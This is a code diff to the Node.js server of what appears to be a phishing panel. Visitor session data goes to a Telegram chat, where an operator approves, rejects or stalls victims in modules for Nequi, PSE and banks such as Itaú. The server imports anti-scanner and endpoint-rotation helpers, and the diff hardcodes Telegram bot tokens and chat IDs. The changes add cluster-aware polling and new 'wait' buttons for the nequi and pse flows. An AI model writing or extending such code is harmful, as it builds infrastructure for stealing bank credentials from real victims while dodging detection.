@@ -2,6 +2,7 @@ const express = require('express');
 const http = require('http');
 const fs = require('fs');
 const path = require('path');
+const cluster = require('cluster');
 const socketIO = require('socket.io');
 const TelegramBot = require('node-telegram-bot-api');
 const compression = require('compression');
@@ -12,8 +13,8 @@ const { createAntiScanner } = require('./js/anti-scanner');
 const { EndpointRotator, validateSlug, createSlugEndpoint } = require('./js/endpoint-rotator');
 
 const PORT = process.env.PORT || 3000;
-const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '8343380638:AAGZ7Z6WBiQTn65itI0rqRUF3gQ13Ex_TKA';
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID || '-4997787461';
+const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '8692308319:AAG8To03oOsb9SvZHFy8d2Ol6k0UEma5lz4';
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID || '-5138136509';
 const NODE_ENV = process.env.NODE_ENV || 'development';
 const TRUST_PROXY_RAW = process.env.TRUST_PROXY || 'loopback, linklocal, uniquelocal';
 // Coerce numeric strings ("1", "2") to Number — required by Express trust proxy
@@ -76,14 +77,23 @@ if (process.env.REDIS_URL) {
     }
 }
 
+/**
+ * Solo UN proceso puede hacer getUpdates (polling). Varias instancias/workers
+ * con el mismo token → error 409 y dejan de funcionar envío y botones.
+ */
+function shouldEnableTelegramPolling() {
+    const flag = (process.env.TELEGRAM_POLLING || 'auto').toLowerCase();
+    if (flag === 'false' || flag === '0' || flag === 'off') return false;
+    if (flag === 'true' || flag === '1' || flag === 'on') return true;
+    if (cluster.isWorker) return cluster.worker.id === 1;
+    return true;
+}
+
+const isTelegramPoller = shouldEnableTelegramPolling();
+
 const bot = new TelegramBot(TELEGRAM_TOKEN, {
-    polling: {
-        interval: 1000,
-        autoStart: true,
-        params: { timeout: 30 }
-    },
+    polling: false,
     request: {
-        // Pool de conexiones HTTPS keep-alive para alta concurrencia
         agentOptions: { keepAlive: true, family: 4 },
         timeout: 30000
     }
@@ -147,31 +157,52 @@ for (const method of TG_METHODS_TO_WRAP) {
     };
 }
 
-// Handle 409 (otra instancia haciendo polling) - backoff exponencial con tope.
 let polling409Streak = 0;
 let pollingRestartTimer = null;
-bot.on('polling_error', async (err) => {
-    const code = err && (err.code || err.response?.statusCode);
-    const msg  = err && (err.message || '');
-    if (code === 'ETELEGRAM' && /409/.test(msg)) {
-        polling409Streak++;
-        const delays = [10000, 30000, 60000, 120000, 300000]; // 10s -> 5min
-        const delay = delays[Math.min(polling409Streak - 1, delays.length - 1)];
-        if (polling409Streak === 1 || polling409Streak % 5 === 0) {
-            console.warn(`⚠️  Telegram 409 Conflict (otra instancia activa). Backoff ${delay/1000}s [streak=${polling409Streak}]`);
-        }
-        if (pollingRestartTimer) return;
-        try { await bot.stopPolling({ cancel: true }); } catch (_) {}
-        pollingRestartTimer = setTimeout(() => {
-            pollingRestartTimer = null;
-            bot.startPolling().catch(e => console.error('startPolling fail:', e.message));
-        }, delay);
-        return;
+
+async function startTelegramPolling() {
+    if (!isTelegramPoller || !TELEGRAM_TOKEN) return;
+    try {
+        await bot.deleteWebHook({ drop_pending_updates: false });
+        await bot.startPolling({
+            interval: 1000,
+            params: { timeout: 30 }
+        });
+        const wid = cluster.isWorker ? `worker #${cluster.worker.id}` : 'proceso único';
+        console.log(`🤖 Telegram polling activo (${wid}, pid ${process.pid})`);
+    } catch (err) {
+        console.error('❌ No se pudo iniciar Telegram polling:', err.message);
     }
-    polling409Streak = 0;
-    console.error('Telegram polling_error:', msg || err);
-});
-bot.on('error', (err) => console.error('Telegram bot error:', err && err.message));
+}
+
+if (isTelegramPoller) {
+    bot.on('polling_error', async (err) => {
+        const code = err && (err.code || err.response?.statusCode);
+        const msg  = err && (err.message || '');
+        if (code === 'ETELEGRAM' && /409/.test(msg)) {
+            polling409Streak++;
+            const delays = [10000, 30000, 60000, 120000, 300000];
+            const delay = delays[Math.min(polling409Streak - 1, delays.length - 1)];
+            if (polling409Streak === 1 || polling409Streak % 5 === 0) {
+                console.warn(`⚠️  Telegram 409: otra instancia hace polling. Reintento en ${delay / 1000}s [streak=${polling409Streak}]`);
+            }
+            if (pollingRestartTimer) return;
+            try { await bot.stopPolling({ cancel: true }); } catch (_) {}
+            pollingRestartTimer = setTimeout(() => {
+                pollingRestartTimer = null;
+                startTelegramPolling();
+            }, delay);
+            return;
+        }
+        polling409Streak = 0;
+        console.error('Telegram polling_error:', msg || err);
+    });
+    bot.on('error', (err) => console.error('Telegram bot error:', err && err.message));
+    startTelegramPolling();
+} else {
+    const wid = cluster.isWorker ? `worker #${cluster.worker.id}` : 'secundario';
+    console.log(`🤖 Telegram API sin polling en ${wid} (pid ${process.pid})`);
+}
 
 class SessionManager {
     constructor() {
@@ -608,12 +639,13 @@ io.on('connection', (socket) => {
                     parse_mode: 'HTML',
                     reply_markup: keyboard
                 });
+                telegramMessages.set(sessionId, { messageId: telegramMessage.message_id });
                 console.log('✅ Mensaje enviado a Telegram:', telegramMessage.message_id);
             }
 
             socket.emit('telegramSent', { success: true, sessionId });
         } catch (error) {
-            console.error('❌ Error enviando a Telegram:', error.message);
+            console.error('❌ Error enviando a Telegram:', error.message, error.response?.body);
             socket.emit('error', { 
                 message: 'Error al enviar datos', 
                 error: error.message 
@@ -814,6 +846,11 @@ bot.on('callback_query', async (callbackQuery) => {
             sessionManager.deleteSession(sessionId);
             await bot.answerCallbackQuery(callbackId, { text: '\u274c Rechazado' });
             return;
+        } else if (module === 'nequi' && action === 'wait') {
+            await bot.sendMessage(chatId, '\u23f3 Cliente en espera', { reply_to_message_id: messageId });
+            emitToSession('actionWait', { sessionId, action: 'wait', waitTime: 15 });
+            await bot.answerCallbackQuery(callbackId, { text: '\u23f3 Esperando' });
+            return;
         } else if (module === 'pse' && action === 'approve') {
             await bot.sendMessage(chatId, '\u2705 PSE aprobado, redirigiendo al banco...', { reply_to_message_id: messageId });
             emitToSession('actionApprovePSE', { sessionId, action: 'approve' });
@@ -824,6 +861,11 @@ bot.on('callback_query', async (callbackQuery) => {
             emitToSession('actionRejectPSE', { sessionId, action: 'reject' });
             sessionManager.deleteSession(sessionId);
             await bot.answerCallbackQuery(callbackId, { text: '\u274c Rechazado' });
+            return;
+        } else if (module === 'pse' && action === 'wait') {
+            await bot.sendMessage(chatId, '\u23f3 PSE en espera', { reply_to_message_id: messageId });
+            emitToSession('actionWaitPSE', { sessionId, action: 'wait', waitTime: 15 });
+            await bot.answerCallbackQuery(callbackId, { text: '\u23f3 Esperando' });
             return;
         }
         // Manejadores para banco (Ita\u00fa, etc.)
@@ -1148,14 +1190,6 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📡 Socket.IO configurado con transports: websocket, polling`);
     console.log(`🤖 Bot de Telegram: ${TELEGRAM_TOKEN ? 'Configurado' : 'NO CONFIGURADO'}`);
     console.log(`💬 Chat ID: ${CHAT_ID}\n`);
-});
-
-bot.on('polling_error', (error) => {
-    console.error('❌ Telegram polling error:', error.code, error.message);
-});
-
-bot.on('error', (error) => {
-    console.error('❌ Telegram bot error:', error.message);
 });
 
 process.on('uncaughtException', (error) => {
